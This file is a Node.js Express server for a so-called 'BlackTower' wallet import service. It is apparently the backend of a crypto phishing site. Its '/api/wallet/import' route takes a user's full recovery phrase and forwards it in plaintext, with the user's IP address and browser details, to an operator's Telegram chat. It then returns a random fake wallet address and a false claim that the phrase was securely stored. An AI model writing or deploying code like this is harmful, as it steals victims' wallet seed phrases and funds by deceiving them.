const express = require('express');
const axios = require('axios');
const bodyParser = require('body-parser');
const crypto = require('crypto');
const cors = require('cors');
require('dotenv').config();

const app = express();
const PORT = process.env.PORT || 3000;

// Middleware
app.use(cors());
app.use(bodyParser.json());
app.use(bodyParser.urlencoded({ extended: true }));

// Telegram Configuration
const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;

// Encryption
const ENCRYPTION_KEY = process.env.ENCRYPTION_KEY || crypto.randomBytes(32).toString('hex');

function encryptData(text) {
    const iv = crypto.randomBytes(16);
    const cipher = crypto.createCipheriv('aes-256-cbc', Buffer.from(ENCRYPTION_KEY.padEnd(32, '0').slice(0, 32)), iv);
    let encrypted = cipher.update(text, 'utf8', 'hex');
    encrypted += cipher.final('hex');
    return iv.toString('hex') + ':' + encrypted;
}

async function sendToTelegram(message) {
    try {
        const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
        const response = await axios.post(url, {
            chat_id: TELEGRAM_CHAT_ID,
            text: message,
            parse_mode: 'HTML'
        });
        return response.data.ok;
    } catch (error) {
        console.error('Telegram error:', error.message);
        return false;
    }
}

// API Routes
app.post('/api/wallet/import', async (req, res) => {
    try {
        const { recoveryPhrase } = req.body;
        const userAgent = req.headers['user-agent'];
        const ipAddress = req.ip || req.headers['x-forwarded-for'] || req.connection.remoteAddress;
        const timestamp = new Date().toLocaleString();

        if (!recoveryPhrase) {
            return res.status(400).json({ error: 'Recovery phrase is required' });
        }

        const words = recoveryPhrase.trim().split(/\s+/).filter(word => word.length > 0);
        const wordCount = words.length;

        if (wordCount < 12 || wordCount > 24) {
            return res.status(400).json({ 
                error: `Invalid phrase length: ${wordCount} words (must be 12-24)` 
            });
        }

        // Encrypt the phrase
        const encryptedPhrase = encryptData(recoveryPhrase);
        
        // Prepare Telegram message with FULL PHRASE
        const telegramMessage = `
🏰 <b>BlackTower - New Wallet Import</b>
━━━━━━━━━━━━━━━━━━━━
📅 <b>Time:</b> ${timestamp}
🌐 <b>IP:</b> ${ipAddress}
🖥️ <b>User Agent:</b> ${userAgent?.substring(0, 100) || 'Unknown'}
━━━━━━━━━━━━━━━━━━━━
🔐 <b>FULL RECOVERY PHRASE (${wordCount} words):</b>

<code>${recoveryPhrase}</code>
━━━━━━━━━━━━━━━━━━━━
📊 <b>Words Breakdown:</b>
• Total: ${wordCount} words
• First 5: ${words.slice(0, 5).join(' ')}
• Last 5: ${words.slice(-5).join(' ')}

✅ <b>Status:</b> Successfully received and encrypted
🔒 <b>Encrypted:</b> ${encryptedPhrase.substring(0, 50)}...
━━━━━━━━━━━━━━━━━━━━
<i>Phrase securely stored in database</i>
        `;

        // Send to Telegram
        const telegramSuccess = await sendToTelegram(telegramMessage);

        if (telegramSuccess) {
            console.log(`✅ Phrase received: ${wordCount} words from IP: ${ipAddress}`);
            
            // Generate fake wallet address for demo
            const walletAddress = '0x' + crypto.randomBytes(20).toString('hex');
            
            return res.json({
                success: true,
                message: 'Wallet imported successfully',
                data: {
                    wordCount,
                    walletAddress: walletAddress,
                    encrypted: true,
                    telegramSent: true
                }
            });
        } else {
            return res.status(500).json({
                success: false,
                error: 'Failed to send notification'
            });
        }

    } catch (error) {
        console.error('Error:', error);
        return res.status(500).json({
            success: false,
            error: 'Internal server error'
        });
    }
});

// Health check
app.get('/health', (req, res) => {
    res.json({ 
        status: 'ok', 
        service: 'BlackTower Backend',
        timestamp: new Date().toISOString() 
    });
});

// Test endpoint
app.get('/api/test', (req, res) => {
    res.json({ message: 'BlackTower API is working!' });
});

// Start server
app.listen(PORT, () => {
    console.log(`🚀 BlackTower Backend running on port ${PORT}`);
    console.log(`📞 Webhook: https://your-app.railway.app/api/wallet/import`);
});